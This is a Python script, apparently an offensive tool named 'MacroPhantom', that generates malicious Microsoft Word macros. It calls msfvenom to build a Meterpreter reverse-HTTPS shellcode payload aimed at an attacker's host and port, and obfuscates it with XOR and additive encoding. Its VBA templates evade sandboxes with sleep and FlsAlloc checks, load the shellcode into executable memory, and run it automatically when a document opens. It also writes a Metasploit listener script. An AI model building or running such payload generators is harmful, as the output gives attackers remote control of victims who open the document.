#!/usr/bin/env python3
import os
import subprocess
import re
import argparse
import platform
import sys
from pathlib import Path
from textwrap import dedent

# Define C# encoder code as a string template
CS_ENCODER_TEMPLATE = '''
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Helper
{{
    class Program
    {{
        static void Main(string[] args)
        {{
            {shellcode}
           
            byte[] encoded1 = new byte[buf.Length]; 
            for (int i = 0; i < buf.Length; i++)
                encoded1[i] = (byte)(((uint)buf[i] + {add_key}) & 0xFF);

            byte[] encoded = new byte[buf.Length]; 

            for (int i = 0; i < buf.Length; i++)
            {{
                buf[i] = (byte)((uint)encoded1[i] ^ {xor_key});
            }}

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2); 
            
            foreach (byte b in buf)
            {{
                hex.AppendFormat("{{0:D}}, ", b);
                counter++;
                if(counter % 50 == 0) {{ 
                    hex.AppendFormat("_{{0}}", Environment.NewLine);
                }}
            }}
            
            // Write the payload to a file named "encoded_shellcode.txt"
            File.WriteAllText("encoded_shellcode.txt", hex.ToString());

            // Read the content of the "encoded_shellcode.txt" file
            string fileContent = File.ReadAllText("encoded_shellcode.txt");

            // Print the content of the "encoded_shellcode.txt" file
            Console.WriteLine("The payload is: " + fileContent);
        }}
    }}
}}
'''

# Define the VBA template for Word macros
VBA_TEMPLATE = '''
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If

    buf = Array( {encoded_shellcode} )

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor {xor_key_decimal}
    Next i
    
    For i = 0 To UBound(buf) 
        buf(i) = buf(i) - {add_key}
    Next i

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
'''

# Legacy VBA template for older versions of Word (pre-2010)
LEGACY_VBA_TEMPLATE = '''
Private Declare Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As Long, ByRef sourceAddr As Any, ByVal length As Long) As Long

Sub MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As Long
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If

    buf = Array( {encoded_shellcode} )

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor {xor_key_decimal}
    Next i
    
    For i = 0 To UBound(buf) 
        buf(i) = buf(i) - {add_key}
    Next i

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
'''

def check_requirements():
    """Check if required tools are installed."""
    print("[*] Checking requirements...")
    requirements_met = True
    
    # Check Python version
    python_version = sys.version_info
    if python_version.major < 3 or (python_version.major == 3 and python_version.minor < 8):
        print("[-] Python 3.8 or higher is required")
        requirements_met = False
    else:
        print("[+] Python version: OK")
    
    # Check if msfvenom is installed
    try:
        subprocess.run(["msfconsole", "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print("[+] Metasploit Framework: OK")
    except (subprocess.SubprocessError, FileNotFoundError):
        print("[-] Metasploit Framework not found. Please install it.")
        requirements_met = False
    
    # Check if mono is installed (if on Linux or macOS)
    if platform.system() != "Windows":
        try:
            subprocess.run(["mono", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
            print("[+] Mono: OK")
        except (subprocess.SubprocessError, FileNotFoundError):
            print("[-] Mono not found. Please install mono-devel.")
            requirements_met = False
    
    return requirements_met

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description='Generate XOR+Caesar encoded VBA macros for Microsoft Word')
    parser.add_argument('--LHOST', required=True, help='Local host IP address')
    parser.add_argument('--LPORT', required=True, help='Local port number')
    parser.add_argument('--payload', default='windows/meterpreter/reverse_https', 
                        help='Msfvenom payload (default: windows/meterpreter/reverse_https)')
    parser.add_argument('--xor-key', type=int, default=250, help='XOR key value (default: 250, 0xFA)')
    parser.add_argument('--add-key', type=int, default=2, help='Additive key value (default: 2)')
    parser.add_argument('--legacy', action='store_true', help='Generate macros for Word 2007 and earlier')
    parser.add_argument('--output-dir', default='.', help='Output directory for generated files')
    return parser.parse_args()

def generate_shellcode(args):
    """Generate shellcode using msfvenom."""
    print(f"[*] Generating shellcode with msfvenom...")
    output_path = Path(args.output_dir) / "shellcode.txt"
    
    msfvenom_command = [
        "msfvenom", 
        "-p", args.payload,
        f"LHOST={args.LHOST}",
        f"LPORT={args.LPORT}",
        "EXITFUNC=thread",
        "-f", "csharp", 
        "-o", str(output_path)
    ]
    
    try:
        subprocess.run(msfvenom_command, check=True)
        print(f"[+] Shellcode generated and saved to {output_path}")
        return output_path
    except subprocess.SubprocessError as e:
        print(f"[-] Error generating shellcode: {e}")
        sys.exit(1)

def encode_shellcode(shellcode_path, args):
    """Encode the shellcode using the C# encoder."""
    print("[*] Encoding shellcode...")
    try:
        # Read the generated shellcode
        with open(shellcode_path, "r") as f:
            shellcode = f.read()
        
        # Create the C# encoder file
        cs_code = CS_ENCODER_TEMPLATE.format(
            shellcode=shellcode, 
            add_key=args.add_key,
            xor_key=hex(args.xor_key)
        )
        
        cs_path = Path(args.output_dir) / "Encoder.cs"
        with open(cs_path, "w") as f:
            f.write(cs_code)
        
        print(f"[+] C# encoder created at {cs_path}")
        
        # Compile the C# encoder
        exe_path = Path(args.output_dir) / "Encoder.exe"
        platform_flag = "-platform:x64" if platform.architecture()[0] == "64bit" else "-platform:x86"
        
        compile_command = [
            "mcs" if platform.system() != "Windows" else "csc",
            platform_flag,
            "-unsafe",
            "-r:System.Configuration.Install",
            str(cs_path),
            f"-out:{exe_path}"
        ]
        
        subprocess.run(compile_command, check=True)
        print(f"[+] C# encoder compiled to {exe_path}")
        
        # Run the encoder
        if platform.system() != "Windows":
            run_command = ["mono", str(exe_path)]
        else:
            run_command = [str(exe_path)]
        
        subprocess.run(run_command, check=True)
        
        # Read the encoded shellcode
        encoded_path = Path(args.output_dir) / "encoded_shellcode.txt"
        with open(encoded_path, "r") as f:
            encoded_shellcode = f.read()
        
        print(f"[+] Shellcode encoded successfully")
        return encoded_shellcode
        
    except Exception as e:
        print(f"[-] Error encoding shellcode: {e}")
        sys.exit(1)

def generate_macros(encoded_shellcode, args):
    """Generate Word macros with the encoded shellcode."""
    print("[*] Generating Word VBA macros...")
    
    # Choose template based on legacy option
    template = LEGACY_VBA_TEMPLATE if args.legacy else VBA_TEMPLATE
    
    # Generate the macro content
    macro_content = template.format(
        encoded_shellcode=encoded_shellcode,
        xor_key_decimal=args.xor_key,
        add_key=args.add_key
    )
    
    # Write to file
    macro_path = Path(args.output_dir) / "macro_payload.txt"
    with open(macro_path, "w") as f:
        f.write(macro_content)
    
    print(f"[+] VBA macro code generated at {macro_path}")
    return macro_path

def generate_handler(args):
    """Generate Metasploit handler resource script."""
    print("[*] Creating Metasploit handler script...")
    
    handler_content = dedent(f'''
    use exploit/multi/handler
    set payload {args.payload}
    set LHOST {args.LHOST}
    set LPORT {args.LPORT}
    set exitfunc thread
    set ExitOnSession false
    set EnableStageEncoding true
    run -j
    ''').strip()
    
    handler_path = Path(args.output_dir) / "handler.rc"
    with open(handler_path, "w") as f:
        f.write(handler_content)
    
    print(f"[+] Metasploit handler script created at {handler_path}")
    print(f"[*] Run with: msfconsole -r {handler_path}")

def main():
    print('''
    ███╗   ███╗ █████╗  ██████╗██████╗  ██████╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
    ████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
    ██╔████╔██║███████║██║     ██████╔╝██║   ██║██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
    ██║╚██╔╝██║██╔══██║██║     ██╔══██╗██║   ██║██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║╚██████╔╝██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
                         Invisible Office Macro Shellcode Generator
                         Created by Ivan Spiridonov (xbz0n) | https://xbz0n.sh
    ''')
    print("MacroPhantom - Advanced VBA Payload Generator")
    print("--------------------------------------------")
    
    # Check requirements
    if not check_requirements():
        print("[-] Please install missing requirements and try again")
        sys.exit(1)
    
    # Parse arguments
    args = parse_arguments()
    
    # Create output directory if it doesn't exist
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Main workflow
    shellcode_path = generate_shellcode(args)
    encoded_shellcode = encode_shellcode(shellcode_path, args)
    macro_path = generate_macros(encoded_shellcode, args)
    generate_handler(args)
    
    # Print Word version compatibility
    if args.legacy:
        print("\n[*] Word Compatibility: The generated macros are compatible with Word 2003-2007")
    else:
        print("\n[*] Word Compatibility: The generated macros are compatible with Word 2010-2021 and Microsoft 365")
    
    print(f"\n[+] All files generated successfully in {args.output_dir}")
    print("[*] Next steps:")
    print(f"  1. Copy the VBA code from {macro_path}")
    print("  2. Open Microsoft Word, press Alt+F11 to open the VBA editor")
    print("  3. Insert a new module under 'Normal' project")
    print("  4. Paste the code and save as a macro-enabled document (.docm)")
    print(f"  5. Start the Metasploit handler with: msfconsole -r {Path(args.output_dir) / 'handler.rc'}")

if __name__ == "__main__":
    main() 